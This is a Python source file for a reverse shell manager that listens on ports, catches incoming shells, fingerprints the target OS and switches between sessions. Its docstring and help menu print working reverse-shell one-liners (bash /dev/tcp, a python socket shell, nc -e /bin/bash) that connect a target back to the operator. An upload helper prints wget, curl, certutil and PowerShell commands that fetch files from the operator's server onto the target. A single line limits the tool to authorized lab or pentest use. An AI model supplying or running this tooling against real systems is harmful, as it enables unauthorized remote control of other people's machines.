#!/usr/bin/env python3
"""
Reverse Shell Listener Manager
================================
A lightweight multi-session reverse shell manager.
Listens for incoming connections, manages multiple sessions
simultaneously, and provides an interactive shell per session
with command history and session logging.

Features:
  - Listen on multiple ports simultaneously
  - Tab-style session switching (session 1, 2, 3...)
  - Command history per session (up arrow)
  - Session logging to file (timestamped)
  - Background sessions — interact with one while others stay alive
  - Session info: IP, port, OS fingerprint attempt
  - Clean session list with status indicators

Usage:
    python rsm.py                        # default port 4444
    python rsm.py -p 4444                # custom port
    python rsm.py -p 4444 -p 5555        # multiple ports
    python rsm.py -p 4444 --log          # enable session logging

Then on target machine (bash):
    bash -i >& /dev/tcp/<your-ip>/4444 0>&1

Or with netcat:
    nc <your-ip> 4444 -e /bin/bash

WARNING:
    For authorized use in CTF, lab, and pentest environments only.
"""

import socket
import select
import sys
import os
import threading
import argparse
import readline
import time
from datetime import datetime
from queue import Queue, Empty


# ─────────────────────────────────────────────
# Colors
# ─────────────────────────────────────────────

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BLUE   = "\033[94m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"
    CLEAR  = "\033[2J\033[H"

def red(t):    return f"{C.RED}{t}{C.RESET}"
def green(t):  return f"{C.GREEN}{t}{C.RESET}"
def yellow(t): return f"{C.YELLOW}{t}{C.RESET}"
def blue(t):   return f"{C.BLUE}{t}{C.RESET}"
def bold(t):   return f"{C.BOLD}{t}{C.RESET}"
def cyan(t):   return f"{C.CYAN}{t}{C.RESET}"


# ─────────────────────────────────────────────
# Session
# ─────────────────────────────────────────────

class Session:
    """
    Represents a single reverse shell connection.
    Tracks the socket, metadata, command history, and output buffer.
    """
    _id_counter = 0

    def __init__(self, sock, addr, port):
        Session._id_counter += 1
        self.id        = Session._id_counter
        self.sock      = sock
        self.ip        = addr[0]
        self.port      = port
        self.connected = True
        self.history   = []          # command history for this session
        self.log_lines = []          # full session log
        self.os_hint   = "unknown"
        self.started   = datetime.now()
        self.last_seen = datetime.now()
        self.output_buf = ""

        self.log(f"Session {self.id} opened from {self.ip}:{addr[1]}")
        self._fingerprint()

    def _fingerprint(self):
        """
        Sends a quick fingerprint command to guess the target OS.
        Tries 'uname -a' — if it responds, it's Linux/Mac.
        Windows won't respond meaningfully to this.
        """
        try:
            self.sock.settimeout(2)
            self.sock.send(b"uname -a 2>/dev/null || ver\n")
            time.sleep(1)
            data = b""
            try:
                while True:
                    chunk = self.sock.recv(1024)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass

            banner = data.decode(errors="ignore").strip()
            if "linux" in banner.lower():
                self.os_hint = "Linux"
            elif "darwin" in banner.lower():
                self.os_hint = "macOS"
            elif "windows" in banner.lower() or "microsoft" in banner.lower():
                self.os_hint = "Windows"
            else:
                self.os_hint = f"unknown ({banner[:30]})" if banner else "unknown"

            self.sock.settimeout(None)
        except Exception:
            self.os_hint = "unknown"

    def send(self, cmd):
        """Sends a command to the remote shell."""
        if not self.connected:
            return False
        try:
            if not cmd.endswith("\n"):
                cmd += "\n"
            self.sock.send(cmd.encode())
            self.history.append(cmd.strip())
            self.log(f">>> {cmd.strip()}")
            self.last_seen = datetime.now()
            return True
        except Exception:
            self.connected = False
            return False

    def recv(self, timeout=0.3):
        """Receives available output from the remote shell."""
        if not self.connected:
            return ""
        try:
            self.sock.settimeout(timeout)
            data = b""
            while True:
                try:
                    chunk = self.sock.recv(4096)
                    if not chunk:
                        self.connected = False
                        break
                    data += chunk
                except socket.timeout:
                    break
            self.sock.settimeout(None)
            output = data.decode(errors="ignore")
            if output:
                self.log(output)
            return output
        except Exception:
            self.connected = False
            return ""

    def close(self):
        """Closes the session socket."""
        self.connected = False
        try:
            self.sock.close()
        except Exception:
            pass
        self.log(f"Session {self.id} closed")

    def log(self, text):
        """Appends to the session log."""
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_lines.append(f"[{ts}] {text}")

    def duration(self):
        delta = datetime.now() - self.started
        mins  = int(delta.total_seconds() // 60)
        secs  = int(delta.total_seconds() % 60)
        return f"{mins}m{secs}s"

    def status(self):
        if self.connected:
            return green("ALIVE")
        return red("DEAD")

    def __str__(self):
        return (
            f"  [{self.id}] {self.ip:<16} "
            f"OS: {self.os_hint:<10} "
            f"Duration: {self.duration():<8} "
            f"Status: {self.status()}"
        )


# ─────────────────────────────────────────────
# Listener Thread
# ─────────────────────────────────────────────

class Listener(threading.Thread):
    """
    Listens on a port and pushes incoming connections
    to the shared session queue.
    """
    def __init__(self, port, session_queue):
        super().__init__(daemon=True)
        self.port          = port
        self.session_queue = session_queue
        self.running       = True
        self.server_sock   = None

    def run(self):
        try:
            self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_sock.bind(("0.0.0.0", self.port))
            self.server_sock.listen(5)
            self.server_sock.settimeout(1)

            print(green(f"\n[+] Listening on port {self.port}"))

            while self.running:
                try:
                    conn, addr = self.server_sock.accept()
                    self.session_queue.put((conn, addr, self.port))
                    print(f"\n{green('[+]')} New connection from {addr[0]}:{addr[1]} on port {self.port}")
                    print(f"    Type {bold('sessions')} to see all connections")
                except socket.timeout:
                    continue
                except Exception:
                    break

        except OSError as e:
            print(red(f"[!] Could not bind to port {self.port}: {e}"))

    def stop(self):
        self.running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass


# ─────────────────────────────────────────────
# Session Manager
# ─────────────────────────────────────────────

class SessionManager:
    """
    Core manager — tracks all sessions, handles the interactive
    console, and routes user commands to the correct session.
    """
    def __init__(self, ports, log_sessions=False):
        self.sessions      = {}       # id -> Session
        self.active        = None     # currently interacting session id
        self.session_queue = Queue()
        self.listeners     = []
        self.log_sessions  = log_sessions
        self.running       = True

        # Setup readline for command history
        readline.set_history_length(500)

        # Start listeners
        for port in ports:
            listener = Listener(port, self.session_queue)
            listener.start()
            self.listeners.append(listener)

        # Background thread to pick up new sessions
        t = threading.Thread(target=self._accept_sessions, daemon=True)
        t.start()

    def _accept_sessions(self):
        """Picks up new connections from the queue."""
        while self.running:
            try:
                conn, addr, port = self.session_queue.get(timeout=1)
                session = Session(conn, addr, port)
                self.sessions[session.id] = session
                print(f"\n{bold(green(f'[Session {session.id}]'))} {session.ip} ({session.os_hint})")
            except Empty:
                continue
            except Exception:
                continue

    def _prompt(self):
        """Returns the current prompt string."""
        if self.active and self.active in self.sessions:
            s = self.sessions[self.active]
            status = green("*") if s.connected else red("*")
            return f"\n{bold(cyan('RSM'))}[{status}{bold(str(self.active))}]> "
        return f"\n{bold(cyan('RSM'))}> "

    def print_banner(self):
        print(f"\n{'=' * 55}")
        print(bold(cyan("  Reverse Shell Manager")))
        print(f"{'=' * 55}")
        print(f"  Type {bold('help')} for available commands")
        print(f"  Waiting for incoming connections...\n")

    def cmd_sessions(self):
        """Lists all sessions."""
        if not self.sessions:
            print(yellow("  No active sessions."))
            return
        print(f"\n  {'ID':<5} {'IP':<18} {'OS':<12} {'Duration':<10} {'Status'}")
        print(f"  {'─' * 52}")
        for s in self.sessions.values():
            active_marker = bold(" <-- active") if s.id == self.active else ""
            print(str(s) + active_marker)
        print()

    def cmd_interact(self, session_id):
        """
        Enters interactive mode with a specific session.
        User input is sent directly to the remote shell.
        Output is printed in real time.
        Press Ctrl+C or type 'background' to return to the manager.
        """
        if session_id not in self.sessions:
            print(red(f"  [!] Session {session_id} not found"))
            return

        session = self.sessions[session_id]
        if not session.connected:
            print(red(f"  [!] Session {session_id} is no longer connected"))
            return

        self.active = session_id

        print(f"\n{bold(green(f'[*] Interacting with session {session_id}'))}")
        print(f"    {session.ip} | {session.os_hint} | running {session.duration()}")
        print(f"    Type {bold('background')} to return to manager")
        print(f"    Type {bold('exit')} to kill this session")
        print(f"    Press {bold('Ctrl+C')} to background")
        print(f"{'─' * 50}\n")

        # Flush any pending output
        initial = session.recv(timeout=0.5)
        if initial:
            print(initial, end="")

        # Setup per-session readline history
        readline.clear_history()
        for cmd in session.history[-50:]:
            readline.add_history(cmd)

        try:
            while True:
                # Check for incoming data before prompting
                output = session.recv(timeout=0.1)
                if output:
                    print(output, end="", flush=True)

                if not session.connected:
                    print(red("\n[!] Connection lost"))
                    break

                try:
                    cmd = input()
                except EOFError:
                    break

                if cmd.strip().lower() == "background":
                    print(yellow(f"\n[*] Session {session_id} backgrounded"))
                    break

                if cmd.strip().lower() == "exit":
                    session.close()
                    del self.sessions[session_id]
                    self.active = None
                    print(red(f"\n[*] Session {session_id} killed"))
                    break

                if not session.send(cmd):
                    print(red("\n[!] Failed to send — connection lost"))
                    session.connected = False
                    break

                # Wait for output
                time.sleep(0.3)
                output = session.recv(timeout=0.5)
                if output:
                    print(output, end="", flush=True)

        except KeyboardInterrupt:
            print(yellow(f"\n\n[*] Session {session_id} backgrounded (Ctrl+C)"))

        # Save log if enabled
        if self.log_sessions:
            self._save_log(session)

    def _save_log(self, session):
        """Saves session log to a timestamped file."""
        ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"session_{session.id}_{session.ip}_{ts}.log"
        try:
            with open(filename, "w") as f:
                f.write(f"Session {session.id} | {session.ip} | {session.os_hint}\n")
                f.write(f"Started: {session.started}\n")
                f.write("=" * 50 + "\n\n")
                f.write("\n".join(session.log_lines))
            print(green(f"[+] Session log saved: {filename}"))
        except Exception as e:
            print(red(f"[!] Could not save log: {e}"))

    def cmd_kill(self, session_id):
        """Kills a session."""
        if session_id not in self.sessions:
            print(red(f"  [!] Session {session_id} not found"))
            return
        self.sessions[session_id].close()
        del self.sessions[session_id]
        if self.active == session_id:
            self.active = None
        print(yellow(f"  [*] Session {session_id} killed"))

    def cmd_kill_all(self):
        """Kills all sessions."""
        for s in list(self.sessions.values()):
            s.close()
        self.sessions.clear()
        self.active = None
        print(yellow("  [*] All sessions killed"))

    def cmd_history(self, session_id):
        """Prints command history for a session."""
        if session_id not in self.sessions:
            print(red(f"  [!] Session {session_id} not found"))
            return
        history = self.sessions[session_id].history
        if not history:
            print(yellow("  No command history for this session."))
            return
        print(f"\n  Command history for session {session_id}:")
        for i, cmd in enumerate(history, 1):
            print(f"  {i:>4}  {cmd}")

    def cmd_upload_hint(self, session_id):
        """
        Prints a quick reference for uploading files to the target.
        Uses common one-liner methods available on most systems.
        """
        if session_id not in self.sessions:
            print(red(f"  [!] Session {session_id} not found"))
            return
        s = self.sessions[session_id]
        your_ip = self._get_local_ip()
        print(f"\n  File transfer methods for session {session_id} ({s.ip}):")
        print(f"\n  1. Python HTTP server (on your machine):")
        print(f"     python3 -m http.server 8080")
        print(f"\n  2. Download on target (Linux):")
        print(f"     wget http://{your_ip}:8080/file.txt")
        print(f"     curl http://{your_ip}:8080/file.txt -o file.txt")
        print(f"\n  3. Download on target (Windows):")
        print(f"     certutil -urlcache -f http://{your_ip}:8080/file.txt file.txt")
        print(f"     powershell -c \"iwr http://{your_ip}:8080/file.txt -OutFile file.txt\"")

    def _get_local_ip(self):
        """Returns the local IP address."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "YOUR_IP"

    def cmd_help(self):
        """Prints help menu."""
        print(f"""
  {bold('COMMANDS')}
  {'─' * 50}
  {bold('sessions')}              List all active sessions
  {bold('interact <id>')}         Interact with a session
  {bold('kill <id>')}             Kill a specific session
  {bold('kill all')}              Kill all sessions
  {bold('history <id>')}          Show command history for a session
  {bold('upload <id>')}           Show file upload methods for a session
  {bold('clear')}                 Clear the screen
  {bold('exit')}                  Exit RSM (kills all sessions)

  {bold('INSIDE A SESSION')}
  {'─' * 50}
  {bold('background')}            Return to manager (keep session alive)
  {bold('exit')}                  Kill this session
  {bold('Ctrl+C')}                Background the session

  {bold('REVERSE SHELL ONE-LINERS')}  (run on target)
  {'─' * 50}
  bash -i >& /dev/tcp/{self._get_local_ip()}/4444 0>&1
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{self._get_local_ip()}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  nc {self._get_local_ip()} 4444 -e /bin/bash
""")

    def run(self):
        """Main interactive loop."""
        self.print_banner()

        while self.running:
            try:
                prompt = self._prompt()
                user_input = input(prompt).strip()

                if not user_input:
                    continue

                parts = user_input.split()
                cmd   = parts[0].lower()

                if cmd == "sessions":
                    self.cmd_sessions()

                elif cmd == "interact" and len(parts) >= 2:
                    try:
                        sid = int(parts[1])
                        self.cmd_interact(sid)
                    except ValueError:
                        print(red("  [!] Usage: interact <session_id>"))

                elif cmd == "kill":
                    if len(parts) >= 2:
                        if parts[1].lower() == "all":
                            self.cmd_kill_all()
                        else:
                            try:
                                self.cmd_kill(int(parts[1]))
                            except ValueError:
                                print(red("  [!] Usage: kill <session_id> or kill all"))
                    else:
                        print(red("  [!] Usage: kill <session_id> or kill all"))

                elif cmd == "history" and len(parts) >= 2:
                    try:
                        self.cmd_history(int(parts[1]))
                    except ValueError:
                        print(red("  [!] Usage: history <session_id>"))

                elif cmd == "upload" and len(parts) >= 2:
                    try:
                        self.cmd_upload_hint(int(parts[1]))
                    except ValueError:
                        print(red("  [!] Usage: upload <session_id>"))

                elif cmd == "clear":
                    print(C.CLEAR, end="")

                elif cmd == "help":
                    self.cmd_help()

                elif cmd == "exit":
                    print(yellow("\n[*] Shutting down RSM..."))
                    self.cmd_kill_all()
                    for listener in self.listeners:
                        listener.stop()
                    self.running = False
                    break

                else:
                    print(yellow(f"  [?] Unknown command: '{cmd}' — type 'help'"))

            except KeyboardInterrupt:
                print(yellow("\n\n[*] Ctrl+C — type 'exit' to quit RSM"))
            except EOFError:
                break


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="RSM — Reverse Shell Manager",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python rsm.py                     # listen on default port 4444
  python rsm.py -p 4444             # custom port
  python rsm.py -p 4444 -p 5555     # multiple ports
  python rsm.py -p 4444 --log       # log all sessions to files
        """
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        action="append",
        dest="ports",
        default=[],
        help="Port to listen on (can specify multiple times)"
    )
    parser.add_argument(
        "--log",
        action="store_true",
        help="Save session logs to files"
    )
    args = parser.parse_args()

    ports = args.ports if args.ports else [4444]

    manager = SessionManager(ports=ports, log_sessions=args.log)
    manager.run()


if __name__ == "__main__":
    main()
